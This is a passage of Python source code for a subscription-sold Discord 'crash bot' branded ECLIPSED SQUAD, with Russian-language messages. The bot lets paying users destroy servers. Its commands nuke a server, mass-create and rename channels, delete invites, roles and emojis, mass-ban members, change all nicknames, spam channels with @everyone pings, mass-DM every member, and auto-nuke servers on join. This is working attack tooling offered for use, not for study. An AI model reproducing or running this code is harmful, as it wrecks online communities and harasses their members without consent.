                await message.channel.send(embed=embed)
            return

        # !set_spam_text <текст> — сменить дефолтный текст для !nuke (только OWNER_ID)
        if content.startswith("!set_spam_text"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split(maxsplit=1)
            if len(parts) < 2 or not parts[1].strip():
                await message.channel.send(
                    "Использование: `!set_spam_text <текст>`\n"
                    f"Текущий текст:\n```{config.SPAM_TEXT[:500]}```"
                )
                return
            new_text = parts[1]
            config.SPAM_TEXT = new_text
            save_spam_text()
            embed = discord.Embed(
                title="✅ Текст нюка обновлён",
                description=f"```{new_text[:1000]}```",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь !nuke будет использовать этот текст")
            await message.channel.send(embed=embed)
            return

        # !get_spam_text — показать текущий текст (только OWNER_ID)
        if content == "!get_spam_text":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            embed = discord.Embed(
                title="📋 Текущий текст нюка",
                description=f"```{config.SPAM_TEXT[:1000]}```",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD")
            await message.channel.send(embed=embed)
            return

        # Любая другая команда — выполняем на активном сервере
        # Служебные ЛС-команды никогда не отправляются на сервер
        DM_ONLY_COMMANDS = (
            "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
            "!owl_add", "!owl_remove", "!owl_list",
            "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
            "!pm_add", "!pm_remove", "!pm_list",
            "!set_spam_text", "!get_spam_text",
        )
        if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
            return

        if content.startswith("!") and content != "!":
            gid = active_guild.get(message.author.id)
            if not gid:
                # Сервер не выбран — предлагаем выбрать
                guilds = list(bot.guilds)
                if not guilds:
                    await message.channel.send("Бот не на серверах.")
                    return
                lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
                view = GuildSelectView(guilds, message.author.id)
                await message.channel.send(
                    f"Сервер не выбран. Выбери на каком выполнить `{content}`:\n{lines}",
                    view=view
                )
                # Сохраняем команду чтобы выполнить после выбора — не делаем, просто просим выбрать
                return
            guild = bot.get_guild(gid)
            if not guild:
                await message.channel.send("Активный сервер недоступен. Выбери другой через `!guilds`.")
                active_guild.pop(message.author.id, None)
                return
            await run_dm_command(message, guild, content)
            return

    # ── Обычная обработка на сервере ────────────────────────
    if message.guild and is_guild_blocked(message.guild.id):
        return  # Сервер заблокирован — игнорируем всё
    if message.content.strip() == "!" and is_whitelisted(message.author.id):
        ctx = await bot.get_context(message)
        await help_cmd(ctx)
        return
    await bot.process_commands(message)
    log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)


@bot.event
async def on_ready():
    load_whitelist()
    load_blocked_guilds()
    load_premium()
    load_spam_text()
    load_auto_super_nuke()
    bot.tree.clear_commands(guild=None)

    # ── SLASH: доступны всем вайтлист ──────────────────────

    @bot.tree.command(name="sp", description="☠️ Спам сообщением")
    @app_commands.describe(count="Количество (макс 50)", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    @app_commands.checks.cooldown(1, 300, key=lambda i: (i.user.id, i.channel_id))
    async def sp(interaction: discord.Interaction, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.followup.send(embed=embed, ephemeral=True); return
        if count > 50:
            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
                await asyncio.sleep(0.5)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
            except Exception:
                pass

    @bot.tree.command(name="spkd", description="☠️ Спам с задержкой")
    @app_commands.describe(delay="Задержка в секундах", count="Количество (макс 50)", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def spkd(interaction: discord.Interaction, delay: int, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.followup.send(embed=embed, ephemeral=True); return
        if count > 50:
            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
        if delay < 0:
            await interaction.followup.send("❌ Задержка не может быть отрицательной.", ephemeral=True); return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений, задержка **{delay}с**.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
            except Exception:
                pass
            await asyncio.sleep(max(delay, 0.5))

    @bot.tree.command(name="nuke", description="💀 Краш сервера")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_nuke(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        guild = interaction.guild
        if is_guild_blocked(guild.id):
            await interaction.response.send_message("🔒 Сервер заблокирован.", ephemeral=True); return
        if nuke_running.get(guild.id):
            await interaction.response.send_message("⚡ Краш уже запущен.", ephemeral=True); return
        nuke_running[guild.id] = True
        nuke_starter[guild.id] = interaction.user.id
        last_nuke_time[guild.id] = asyncio.get_running_loop().time()
        last_spam_text[guild.id] = config.SPAM_TEXT
        await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
        asyncio.create_task(do_nuke(guild, config.SPAM_TEXT))

    @bot.tree.command(name="stop", description="⛔ Остановить краш")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_stop(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        uid = interaction.user.id
        guild = interaction.guild
        starter_id = nuke_starter.get(guild.id)

        if uid == config.OWNER_ID:
            nuke_running[guild.id] = False
            nuke_starter.pop(guild.id, None)
            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return

        if starter_id is None:
            nuke_running[guild.id] = False
            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return

        if starter_id == config.OWNER_ID:
            embed = discord.Embed(description="❌ Нюк запущен **овнером** — только он может остановить.", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return

        if is_premium(starter_id) and not is_premium(uid):
            embed = discord.Embed(description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return

        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await interaction.response.send_message("✅ Остановлено.", ephemeral=True)

    @bot.tree.command(name="rename", description="⚡ Переименовать все каналы")
    @app_commands.describe(name="Новое название")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_rename(interaction: discord.Interaction, name: str):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        await asyncio.gather(*[c.edit(name=name) for c in interaction.guild.channels], return_exceptions=True)
        await interaction.followup.send("✅ Готово.", ephemeral=True)

    @bot.tree.command(name="addch", description="⚡ Создать каналы")
    @app_commands.describe(count="Количество (макс 500)", name="Название канала")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_addch(interaction: discord.Interaction, count: int = 10, name: str = None):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if count > 500:
            await interaction.response.send_message("❌ Максимум 500.", ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        ch_name = name or config.GUILD_NAME
        results = await asyncio.gather(*[interaction.guild.create_text_channel(name=ch_name) for _ in range(count)], return_exceptions=True)
        done = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"✅ Создано **{done}** каналов.", ephemeral=True)

    @bot.tree.command(name="invs_delete", description="⚡ Удалить все инвайты")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_invs_delete(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        invites = await interaction.guild.invites()
        await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
        await interaction.followup.send("✅ Готово.", ephemeral=True)

    @bot.tree.command(name="nicks_all", description="⚡ Сменить ники всем")
    @app_commands.describe(nick="Новый ник")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_nicks_all(interaction: discord.Interaction, nick: str):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        targets = [m for m in guild.members if m.id not in (interaction.user.id, bot.user.id, guild.owner_id)]
        await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
        await interaction.followup.send("✅ Готово.", ephemeral=True)

    @bot.tree.command(name="webhooks", description="🔱 Список вебхуков")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_webhooks(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        whs = await interaction.guild.webhooks()
        if not whs:
            await interaction.response.send_message("Вебхуков нет.", ephemeral=True); return
        msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
        await interaction.response.send_message(f"```{msg[:1900]}```", ephemeral=True)

    # ── SLASH: только Premium ───────────────────────────────

    @bot.tree.command(name="massdm", description="💎 [Premium] Масс ДМ всем участникам")
    @app_commands.describe(text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_massdm(interaction: discord.Interaction, text: str):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        members = [m for m in interaction.guild.members if not m.bot]
        await interaction.followup.send(f"📨 Рассылаю ДМ **{len(members)}** участникам...", ephemeral=True)
        sent = 0
        for member in members:
            try:
                await member.send(text); sent += 1
            except Exception:
                pass
            await asyncio.sleep(0.5)
        await interaction.followup.send(f"✅ Отправлено: **{sent}**", ephemeral=True)

    @bot.tree.command(name="massban", description="💎 [Premium] Забанить всех участников")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_massban(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        bot_role = guild.me.top_role
        targets = [m for m in guild.members if not m.bot and m.id != guild.owner_id and (not m.top_role or m.top_role < bot_role)]
        results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
        banned = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"💀 Забанено: **{banned}**", ephemeral=True)

    @bot.tree.command(name="rolesdelete", description="💎 [Premium] Удалить все роли")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_rolesdelete(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        bot_role = interaction.guild.me.top_role
        results = await asyncio.gather(*[r.delete() for r in interaction.guild.roles if r < bot_role and not r.is_default()], return_exceptions=True)
        deleted = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"🗑️ Удалено ролей: **{deleted}**", ephemeral=True)

    @bot.tree.command(name="emojisnuke", description="💎 [Premium] Удалить все эмодзи")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_emojisnuke(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        results = await asyncio.gather(*[e.delete() for e in interaction.guild.emojis], return_exceptions=True)
        deleted = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"💀 Удалено эмодзи: **{deleted}**", ephemeral=True)

    @bot.tree.command(name="serverinfo", description="💎 [Premium] Инфо о сервере")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_serverinfo(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        guild = interaction.guild
        embed = discord.Embed(title=f"☠️ {guild.name}", color=0x0a0a0a)
        embed.add_field(name="👥 Участников", value=str(guild.member_count))
        embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
        embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
        embed.add_field(name="💎 Буст", value=f"Уровень {guild.premium_tier} ({guild.premium_subscription_count} бустов)")
        embed.add_field(name="👑 Овнер", value=str(guild.owner))
        embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @bot.tree.command(name="userinfo", description="💎 [Premium] Инфо о пользователе")
    @app_commands.describe(user_id="Discord ID пользователя")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_userinfo(interaction: discord.Interaction, user_id: str = None):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if user_id:
            try:
                user = await bot.fetch_user(int(user_id))
            except Exception:
                await interaction.response.send_message("❌ Пользователь не найден.", ephemeral=True); return
        else:
            user = interaction.user
        member = interaction.guild.get_member(user.id) if interaction.guild else None
        embed = discord.Embed(title=f"👁️ {user}", color=0x0a0a0a)
        embed.add_field(name="🆔 ID", value=str(user.id))
        embed.add_field(name="📅 Создан", value=user.created_at.strftime("%d.%m.%Y"))
        if member:
            embed.add_field(name="📥 Зашёл", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
            embed.add_field(name="🎭 Роль", value=member.top_role.mention)
            embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
        if user.avatar:
            embed.set_thumbnail(url=user.avatar.url)
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    # ── SLASH: /help — показывает команды по уровню доступа ─

    @bot.tree.command(name="help", description="☠️ Список команд бота")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def slash_help(interaction: discord.Interaction):
        uid = interaction.user.id
        wl = is_whitelisted(uid)
        pm = is_premium(uid) or uid == config.OWNER_ID

        if not wl:
            embed = discord.Embed(
                title="☠️ ECLIPSED — CRASH BOT",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(
            title="☠️ ECLIPSED — CRASH BOT",
            description=(
                "```\n"
                "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
                " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
                " ██║     ██████╔╝███████║███████╗███████║\n"
                " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
                "```"
            ),
            color=0x0a0a0a
        )
        embed.add_field(
            name="💀 УНИЧТОЖЕНИЕ",
            value=(
                "`!nuke` `/nuke` — краш сервера\n"
                "`!stop` `/stop` — остановить краш\n"
                "`!cleanup` — снести всё, оставить один канал\n"
                "`!auto_nuke on/off/info` — авто-краш при входе\n"
                "`!addch` `/addch` — создать каналы"
            ),
            inline=False
        )
        embed.add_field(
            name="⚡ КОНТРОЛЬ",
            value=(
                "`!rename` `/rename` — переименовать каналы\n"
                "`!invs_delete` `/invs_delete` — удалить инвайты\n"
                "`!nicks_all` `/nicks_all` — сменить ники\n"
                "`!webhooks` `/webhooks` — список вебхуков"
            ),
            inline=False
        )
        embed.add_field(
            name="💬 СПАМ",
            value=(
                "`/sp` — спам (макс 50, кд 5 мин)\n"
                "`/spkd` — спам с задержкой"
            ),
            inline=False
        )
        if pm:
            embed.add_field(
                name="� PREMIUM",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!massdm` `/massdm` — масс ДМ\n"
                    "`!massban` `/massban` — массбан\n"
                    "`!rolesdelete` `/rolesdelete` — удалить роли\n"
                    "`!emojisnuke` `/emojisnuke` — удалить эмодзи\n"
                    "`!serverinfo` `/serverinfo` — инфо о сервере\n"
                    "`!userinfo` `/userinfo` — инфо о юзере\n"
                    "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
                    "`!auto_super_nuke on/off/text/info` — авто супер нюк\n"
                    "`!snuke_config` — настройка супер нюка"
                ),
                inline=False
            )
        embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
        embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    await bot.tree.sync()
    for guild in bot.guilds:
        bot.tree.clear_commands(guild=guild)
        await bot.tree.sync(guild=guild)
    print(f"Бот запущен как {bot.user}")


bot.run(config.TOKEN)
